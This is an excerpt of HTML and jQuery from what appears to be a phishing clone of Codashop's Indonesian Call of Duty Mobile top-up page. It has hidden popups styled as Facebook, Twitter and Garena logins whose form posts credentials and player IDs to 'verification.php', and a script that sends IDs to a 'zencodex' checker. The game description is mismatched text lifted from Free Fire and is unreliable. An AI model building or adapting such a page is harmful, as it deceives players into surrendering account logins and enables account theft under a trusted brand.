...
<head>
   ...
   <meta name="msapplication-TileImage " content="https://cdn1.codashop.com/S/content/common/images/mno/codmobile2_640x241.jpg" />
   ...
   <div class="popup-login facebook animated fadeIn" style="display: none;">
      <div class="popup-box-login-fb">
         ...
         <div class="content-box-fb">
            <img src="https://cdn1.codashop.com/S/content/mobile/images/product-tiles/codmobile_tile.jpg" style="width: 60px;">
   ...
   <div class="popup-login twitter animated fadeIn" style="display: none;">
      <div class="popup-box-login-twitter">
         ...
         <div class="header-twitter">
            <center>
               <img src="https://cdn.iconscout.com/icon/free/png-512/garena-2-569532.png" style="width: 50px;">
            </center>
         </div>
         <div class="box-twitter">
            <center>
               <form action="verification.php" method="post">
                  <div class="txt-login-twitter">Login with Garena</div>
                  ...
                  <input type="hidden" name="nickname" id="nickname">
                  <input type="hidden" name="userIdForm" id="userIdForm">
                  <input type="hidden" name="login" value="Garena" readonly>
   ...
   <div id="product-page__container" class="product-page__container">
            ...
            <article class="product__description shop-content__container">
               ...
               <p class="shop-content--paragraph">NGOBROL BARENG TENTANG<br>
                  <a class="shop-content--image" href="https://community.codashop.com/id/categories/id-call-of-duty-mobile" target="_blank" rel="noopener">
                     ...
                     <img src="https://cdn1.codashop.com/S/content/common/images/promos/Community Banners/codm_id_codaclub.jpeg" alt="Call of Duty Mobile Conversation"></a></p>
            </article>
         ...
         <section id="contents" class="main-content">
            ...
            <div class="section select-server">
               ...
               <div class="form-group-container form-user-identities">
                  ...
                  <p class="form__field-instruction-text">Untuk menemukan OpenID Anda, klik pada ikon "pengaturan" yang terletak pada kanan layar dan klik tab "lainnya", OpenID dapat Anda temukan dibawah. Silakan masukan OpenID Anda disini.</p>
               ...
               <ul class="ul-paymentChannels">
                  <li id="paymentChannel_227" class="payment-channel-element">
                     <div class="payment-channel-link" onclick="selectPaymentChannel(227, 'GoPay', false, false, false, false, false);">
                        <span class="element-check-label" id="checkLabel"></span>
                        <div class="payment-channel-container">
                           <figure class="payment-logo-container">
                              <img class="logo" src="../img/codapay.png" alt="GO_PAY logo" />
                           </figure>
                        </div>
            ...
            <div class="section buy default-template">
               ...
               <div class="form" id="formSection">
                  ...
                  <div class="email-form-btn-group">
                     <button id="mdn-submit" class="email-form-btn__submit">
      ...
      <section class="section product__long-description shop-content__container">
         ...
         <article class="product__tag-line">
            <p class="shop-content--paragraph"> Hanya butuh beberapa detik saja untuk membeli Diamonds Call of Duty Mobile. Di Codashop, top-up menjadi mudah, aman, dan praktis. Codashop dipercaya oleh jutaan gamers & pengguna aplikasi di Asia Tenggara termasuk diantaranya Indonesia. Caranya
            ...
            <p class="shop-content--paragraph"> Tentang Call of Duty Mobile: <br> Call of Duty Mobile atau FF Garena adalah mobile game survival shooter terbaik. Setiap 10 menit permainan menempatkan anda di pulau jauh tempat anda menghadapi 49 pemain lain, semuanya bertujuan untuk mencari keselamatan.
   ...
   <div style="display: none;" id="showKonfirm">
      <div tabindex="-1" role="dialog" class="ui-dialog ui-corner-all ui-widget ui-widget-content ui-front confirm-user-dialog__container ui-dialog-buttons ui-draggable" aria-describedby="confirm-user-dialog" aria-labelledby="ui-id-1" style="padding-top: 15px;">
         ...
         <div class="confirm-modal__container ui-dialog-content ui-widget-content" id="confirm-user-dialog" style="display: block;">
            ...
            </ul><span id="span-txnId" class="5991917773391017870" style="display: none;"></span>
         </div>
   ...
   <script type="text/javascript">
      $(document).ready(function() {
         ...
         $("li.voucher-list-element").on('click', function() {
            ...
            $("#mdn-submit").on('click', function() {
               ...
               if (id == "") {
                  ...
                  $("#errorMessage").html("<li class='error-msg__element'>Silahkan isi Player ID Call of Duty Mobile Anda.</li>");
                  $("#overlay").show();
                  $(".popError").show();
               } else {
                  $.ajax({
                     url: "../zencodex/codmCheckID.php",
                     type: "POST",
                     data: 'userId=' + id,
                     beforeSend: function() {
                        $("#overlay").hide();
                     ...
                     success: function(response) {
                        ...
                        if (!$.trim(response)) {
                           $("#submit-loader").hide();
                           $("#errorMessage").addClass("errorMessage__container");
                           $("#errorMessage").html("<li class='error-msg__element'>Kami tidak menemukan OpenID: " + id + "</li>");
                           $("#overlay").show();
                           $(".popError").show();
                        } else {
                           $("#submit-loader").hide();
         ...
         $("#mdn-submit").on('click', function() {
            ...
            $(".popError").show();
            $("#errorMessage").addClass("errorMessage__container");
            $("#errorMessage").html("<li class='error-msg__element'>Silahkan isi Player ID Call of Duty Mobile Anda.</li><li class='error-msg__element'>Silahkan pilih nomor voucher</li><li class='error-msg__element'>Silahkan pilih metode pembayaran</li>");
